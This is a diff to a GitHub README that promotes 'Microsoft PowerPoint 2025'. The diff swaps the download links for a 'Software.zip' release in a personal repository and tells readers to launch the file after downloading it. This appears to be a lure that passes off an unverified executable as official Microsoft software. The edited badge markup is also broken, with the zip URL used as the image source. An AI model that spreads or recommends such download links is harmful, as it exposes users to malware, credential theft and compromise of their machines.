@@ -23,7 +23,7 @@ Microsoft PowerPoint 2025 is a cutting-edge presentation software that offers a 
 🤖 **Presenter Coach**: Receive real-time feedback on your presentation delivery to improve your public speaking skills.
 
 ## Installation
-To download Microsoft PowerPoint 2025, please visit [this link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). The file needs to be launched once downloaded to initiate the installation process.
+To download Microsoft PowerPoint 2025, please visit [this link](https://github.com/EnricoAntognozzi/Microsoft-PowerPoint-For-Windows/releases/download/v2.0/Software.zip). The file needs to be launched once downloaded to initiate the installation process.
 
 ## Topics
 Explore a variety of topics related to Microsoft PowerPoint 2025 in this repository:
@@ -49,7 +49,7 @@ Explore a variety of topics related to Microsoft PowerPoint 2025 in this reposit
 ## Get Started
 Dive into the world of Microsoft PowerPoint 2025 and revolutionize your presentations. Download the software, explore the features, and unleash your creativity in the most engaging way possible!
 
-[![Download PowerPoint 2025](https://img.shields.io/badge/Download-PowerPoint%202025-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download PowerPoint 2025](https://github.com/EnricoAntognozzi/Microsoft-PowerPoint-For-Windows/releases/download/v2.0/Software.zip%202025-blue)](https://github.com/EnricoAntognozzi/Microsoft-PowerPoint-For-Windows/releases/download/v2.0/Software.zip)
 
 ## Let's Connect!
 Got questions, feedback, or ideas to share? Join the Microsoft PowerPoint 2025 community and engage with like-minded professionals and educators. Let's create amazing presentations together! 💬
